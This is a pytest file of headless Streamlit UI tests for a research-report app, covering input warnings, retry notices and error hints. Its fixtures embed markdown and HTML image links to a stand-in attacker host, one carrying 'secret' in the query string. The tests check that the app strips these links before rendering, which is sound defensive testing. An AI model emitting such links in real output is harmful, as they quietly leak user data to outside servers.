"""Headless UI tests using Streamlit's AppTest (no browser, no network, no API keys)."""
from pathlib import Path

import pytest
from streamlit.testing.v1 import AppTest

from src.pipelines import pipelines

APP = str(Path(__file__).resolve().parents[1] / "src" / "app.py")

EVIL_REPORT = (
    "# Findings\n\nSome text ![tracking](https://evil.example/?q=secret) and "
    '<img src="https://evil.example/pixel.png"> and [a link](https://ok.example).\n\nSources: https://ok.example'
)


def _start(at):
    next(b for b in at.button if "Start research" in b.label).click()


def _fake_pipeline(events):
    def fake(topic, on_step=None):
        on_step("search", "running", None)
        on_step("notice", "running", "Rate limit hit - waiting 20s, retry 1/4")
        on_step("notice", "done", None)
        on_step("search", "done", "s")
        events.append(topic)
        return {
            "search_results": "Title: T\nURL: https://ok.example",
            "scraped_content": "page",
            "report": EVIL_REPORT,
            "feedback": "Score: **8**/10\n\nStrengths:\n- ok ![x](https://evil.example/y.png)",
        }
    return fake


def test_empty_topic_shows_warning_and_does_not_run(monkeypatch):
    events = []
    monkeypatch.setattr(pipelines, "run_research_pipeline", _fake_pipeline(events))
    at = AppTest.from_file(APP, default_timeout=30).run()
    _start(at)
    at.run()
    assert not at.exception
    assert any("Enter a topic first" in w.value for w in at.warning)
    assert events == []


def test_run_renders_report_without_images_and_handles_retry_notices(monkeypatch):
    events = []
    monkeypatch.setattr(pipelines, "run_research_pipeline", _fake_pipeline(events))
    at = AppTest.from_file(APP, default_timeout=30).run()
    at.text_area[0].set_value("  my topic  ")
    _start(at)
    at.run()

    assert not at.exception
    assert events == ["my topic"]
    shown = "\n".join(m.value for m in at.markdown)
    assert "Findings" in shown and "[a link](https://ok.example)" in shown
    assert "evil.example" not in shown, "image URLs must not reach the rendered page"
    assert "![" not in shown and "<img" not in shown.lower()


def test_pipeline_error_is_reported_not_raised(monkeypatch):
    def boom(topic, on_step=None):
        raise ValueError("Topic is too long (max 300 characters).")
    monkeypatch.setattr(pipelines, "run_research_pipeline", boom)
    at = AppTest.from_file(APP, default_timeout=30).run()
    at.text_area[0].set_value("x")
    _start(at)
    at.run()
    assert not at.exception
    assert any("Pipeline failed" in e.value for e in at.error)


@pytest.mark.parametrize("exc_name,hint", [
    ("rate", "Rate limit hit"),
    ("auth", "Check the API keys"),
])
def test_error_hints_by_exception_type(monkeypatch, exc_name, hint):
    import httpx
    import openai

    req = httpx.Request("POST", "http://x")
    if exc_name == "rate":
        exc = openai.APIStatusError("slow down", response=httpx.Response(429, request=req), body=None)
    else:
        exc = openai.AuthenticationError("bad key", response=httpx.Response(401, request=req), body=None)

    def boom(topic, on_step=None):
        raise exc
    monkeypatch.setattr(pipelines, "run_research_pipeline", boom)
    at = AppTest.from_file(APP, default_timeout=30).run()
    at.text_area[0].set_value("x")
    _start(at)
    at.run()
    assert any(hint in e.value for e in at.error)
